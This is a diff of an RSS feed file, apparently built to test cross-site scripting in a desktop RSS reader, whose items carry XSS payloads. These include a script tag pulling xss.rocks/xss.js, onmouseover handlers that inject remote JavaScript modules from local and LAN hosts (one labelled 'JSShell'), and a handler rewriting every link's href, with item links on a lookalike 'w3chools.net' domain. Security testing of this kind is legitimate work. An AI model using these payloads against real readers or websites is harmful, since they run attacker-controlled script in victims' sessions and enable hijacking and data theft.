@@ -4,44 +4,20 @@
 <channel>
   <title>Desktop test</title>
   <link>https://www.w3schools.com</link>
-  <description>Get fucking XSS</description>
+  <description>Get freaking XSS</description>
   <item>
-    <title><SCRIPT SRC="http://xss.rocks/xss.js"></SCRIPT></title>
-    <link>localhost</link>
+    <title>XSS Alert</title>
+    <link>https://www.w3chools.net/a</link>
     <description>
-      <a onmouseover="console.log(document)" href="https://google.com">Harmless Link</a>
-      <a onmouseover="document.getElementById('app').style.backgroundColor = 'white'">Harmless Link 2</a>
-      <a onmouseover="document.getElementsByTagName('a').forEach((data) => data.href = 'https://dcarl.me')">Harmless Link 3</a>
-      <a onmouseover="http://">Harmless Link 4</a>
+     <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://localhost:5000/xss.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">XSS alert</a>
     </description>
   </item>
   <item>
-    <title>RSS Tutorial</title>
-    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
-    <description>New RSS tutorial on W3Schools <a>test</a></description>
-  </item>
-  <item>
-    <title>XML Tutorial</title>
-    <link>https://www.w3schools.com/xml</link>
+    <title>XSS Alert2</title>
+    <link>https://www.w3chools.net/c</link>
     <description>
-    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://192.168.0.141/xss2.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
-    <script src="http://localhost/xss.js"></script>
-    </description>
-  </item>
-  <item>
-    <title>JSShell</title>
-    <link>https://www.w3schools.net</link>
-    <description>
-    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = '//192.168.0.141:4848';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
-    </description>
-  </item>
-  <item>
-    <title>JSShell</title>
-    <link>https://www.w3chools.net</link>
-    <description>
-    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://192.168.0.141/xss3.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
+      <a onmouseover="console.log('test')" href="https://google.com">Harmless Link</a>
     </description>
   </item>
 </channel>
-
 </rss> 
